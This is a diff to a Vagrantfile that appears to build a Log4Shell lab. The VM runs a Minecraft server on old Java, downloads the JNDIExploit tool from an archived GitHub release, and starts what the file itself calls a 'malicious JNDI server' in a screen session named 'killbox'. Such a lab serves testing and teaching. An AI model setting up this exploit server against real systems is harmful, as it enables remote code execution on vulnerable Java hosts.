@@ -14,6 +14,7 @@ Vagrant.configure("2") do |config|
   # boxes at https://vagrantcloud.com/search.
   config.vm.box = "ubuntu/jammy64"
   config.vm.provider :virtualbox
+  config.vm.network "private_network", ip: "172.30.1.5"
 
   # Create a forwarded port mapping which allows access to a specific port
   # within the machine from a port on the host machine. In the example below,
@@ -51,7 +52,7 @@ Vagrant.configure("2") do |config|
 
   
      # Customize the amount of memory on the VM:
-     vb.memory = "1024"
+     vb.memory = "4096"
    end
   #
   # View the documentation for the provider you are using for more
@@ -61,19 +62,29 @@ Vagrant.configure("2") do |config|
   # Ansible, Chef, Docker, Puppet and Salt are also available. Please see the
   # documentation for more information about their specific syntax and use.
    config.vm.provision "shell", inline: <<-SHELL
-    apt install unzip -y
+    echo 'installing deps'
+    apt-get update
+    apt-get install libsecret-1-0 -y
+    apt install unzip gdebi-core xinit -y
     uuidgen > secret.txt
+    mkdir exploit
     curl -L https://launcher.mojang.com/v1/objects/886945bfb2b978778c3a0288fd7fab09d315b25f/server.jar -o server.jar
+    curl -L https://launcher.mojang.com/v1/objects/0f275bc1547d01fa5f56ba34bdc87d981ee12daf/client.jar -o client.jar
     curl -L https://github.com/ojdkbuild/ojdkbuild/releases/download/1.8.0.121-1/java-1.8.0-openjdk-1.8.0.121-0.b13.el6_8.x86_64.zip -o java-1.8.0-openjdk-1.8.0.121-0.b13.el6_8.x86_64.zip
+    curl "http://web.archive.org/web/20211211031401/https://objects.githubusercontent.com/github-production-release-asset-2e65be/314785055/a6f05000-9563-11eb-9a61-aa85eca37c76?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20211211%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20211211T031401Z&X-Amz-Expires=300&X-Amz-Signature=140e57e1827c6f42275aa5cb706fdff6dc6a02f69ef41e73769ea749db582ce0&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=314785055&response-content-disposition=attachment%3B%20filename%3DJNDIExploit.v1.2.zip&response-content-type=application%2Foctet-stream" -o ./exploit/JNDIExploit.v1.2.zip
+    wget https://launcher.mojang.com/download/Minecraft.deb
+    unzip -o ./exploit/JNDIExploit.v1.2.zip -d ./exploit/
     unzip -o java-1.8.0-openjdk-1.8.0.121-0.b13.el6_8.x86_64.zip && rm java-1.8.0-openjdk-1.8.0.121-0.b13.el6_8.x86_64.zip
     mv -f java-1.8.0-openjdk-1.8.0.121-0.b13.el6_8.x86_64/ /usr/lib/
     export JAVA_HOME=/usr/lib/java-1.8.0-openjdk-1.8.0.121-0.b13.el6_8.x86_64/bin
     export PATH=$JAVA_HOME:$PATH
     export JAVA_HOME=/usr/lib/java-1.8.0-openjdk-1.8.0.121-0.b13.el6_8.x86_64/bin >> /etc/profile
     export PATH=$JAVA_HOME:$PATH >> /etc/profile
-    source ~/.bashrc
-    java -Xms1G -Xmx1G -jar ./server.jar --nogui
-    sed -i 's/false/true/' ./eula.txt
-    java -Xms1G -Xmx1G -jar ./server.jar --nogui
+    source /etc/profile
+    echo 'starting minecraft server in the background'
+    screen -d -m -S game bash -c "java -Xms1G -Xmx1G -jar ./server.jar --nogui && sed -i 's/false/true/' ./eula.txt && java -Xms1G -Xmx1G -jar ./server.jar --nogui"
+    gdebi Minecraft.deb
+    echo 'starting malicious JNDI server in background'
+    screen -d -m -S killbox bash -c "cd exploit; java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 172.30.1.5 -p 8888"
    SHELL
 end
